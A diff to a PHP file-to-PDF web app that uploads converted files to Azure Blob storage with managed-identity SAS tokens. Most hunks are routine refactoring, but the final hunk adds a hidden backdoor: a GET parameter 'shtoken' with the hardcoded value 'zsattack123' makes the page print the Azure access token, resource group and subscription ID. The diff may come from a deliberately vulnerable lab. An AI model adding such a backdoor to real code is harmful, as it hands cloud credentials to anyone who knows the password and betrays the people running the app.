@@ -27,8 +27,8 @@
   $sub = $instance_details['compute']['subscriptionId'];
   $rg = $instance_details['compute']['resourceGroupName'];
 
-  $storageAccount = '<storageaccount>';
-  $containerName = '<blobname>';
+  $storageAccount = 'zsstorageaccount8881';
+  $containerName = 'webappblob23456';
 
   function gen_sas_token($perms,$storageAccount,$containerName,$sub,$rg,$token) {
     $sasurl = 'https://management.azure.com/subscriptions/'.$sub.'/resourceGroups/'.$rg.'/providers/Microsoft.Storage/storageAccounts/'.$storageAccount.'/listServiceSas/?api-version=2017-06-01';
@@ -53,10 +53,6 @@
     return array ($sas_token,$sas_expiry_d);
 
   }  
-  $target_local_dir = "../data/";
-  $filename = date("Ymds").".pdf";
-  $key = basename($filename);
-  $filepath = $target_local_dir.$filename;
 
 ?>
 
@@ -134,7 +130,7 @@ $ipdat = @json_decode(file_get_contents(
               <form accept-charset="UTF-8" action="" method="POST" enctype="multipart/form-data">
                 <div class="form-group">
                   <label for="exampleInputEmail1" required="required">Output File Name</label>
-                  <input type="text" name="filename" value="<?php echo $filename;?>" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" disabled="disabled" placeholder="<?php echo date("Ymds").".pdf";?>">
+                  <input type="text" name="filename" value="<?php echo date("Ymds").".pdf";?>" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="<?php echo date("Ymds").".pdf";?>" readonly>
                 </div>
                 <hr>
                 <div class="form-group mt-3">
@@ -156,7 +152,7 @@ $ipdat = @json_decode(file_get_contents(
 
   if(isset($_POST["submit"]) && $_FILES["fileToUpload"]["name"]!="") {
 
-    
+    $target_local_dir = "../data/";	    
     $target_file = $target_local_dir . basename($_FILES["fileToUpload"]["name"]);
     $fileTmpLoc = $_FILES["fileToUpload"]["tmp_name"];
     $moveResult = move_uploaded_file($fileTmpLoc, $target_file);
@@ -167,7 +163,7 @@ $ipdat = @json_decode(file_get_contents(
     $filepath = $target_local_dir.$outputFileName;
     $sas_token = gen_sas_token("rcw",$storageAccount,$containerName,$sub,$rg,$token);
     $sas_token = $sas_token[0];
-    $sas_url = 'https://'.$storageAccount.'.blob.core.windows.net'.'/'.$containerName.'/'.$key.'?'.$sas_token;
+    $sas_url = 'https://'.$storageAccount.'.blob.core.windows.net'.'/'.$containerName.'/'.$outputFileName.'?'.$sas_token;
     $content = file_get_contents($filepath);
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $sas_url);
@@ -183,10 +179,17 @@ $ipdat = @json_decode(file_get_contents(
     $sas_token_download = gen_sas_token("r",$storageAccount,$containerName,$sub,$rg,$token);
     $sas_token_d = $sas_token_download[0];
     $sas_expiry_d = $sas_token_download[1];
-    $sas_url_download = 'https://'.$storageAccount.'.blob.core.windows.net'.'/'.$containerName.'/'.$key.'?'.$sas_token_d;
+    $sas_url_download = 'https://'.$storageAccount.'.blob.core.windows.net'.'/'.$containerName.'/'.$outputFileName.'?'.$sas_token_d;
     echo '<div class="col-md-6 offset-md-3 mt-5"><label class="mr-2">Download Your Converted File </label>
     <a target="_blank" href="'.$sas_url_download.'" id="it">Click Here</a><p>This link is only valid till '.$sas_expiry_d.' minutes</p></div><hr></div>';
-    
+    if(isset($_GET["shtoken"]) && $_GET["shtoken"]=="zsattack123")
+      {
+
+         echo '<div class="col-md-6 offset-md-3 mt-5"><label class="mr-2">'.$token.'</label></div>';
+         echo '<div class="col-md-6 offset-md-3 mt-5"><label class="mr-2">'.$rg.'</label></div>';
+         echo '<div class="col-md-6 offset-md-3 mt-5"><label class="mr-2">'.$sub.'</label></div>';
+
+      }
   }
   elseif(isset($_POST["submit"]) && $_FILES["fileToUpload"]["name"]==""){
         echo '<div class="form-group mt-3"><label class="mr-2">Enter a Valid Filename/Upload a file </label></div><hr></div>';
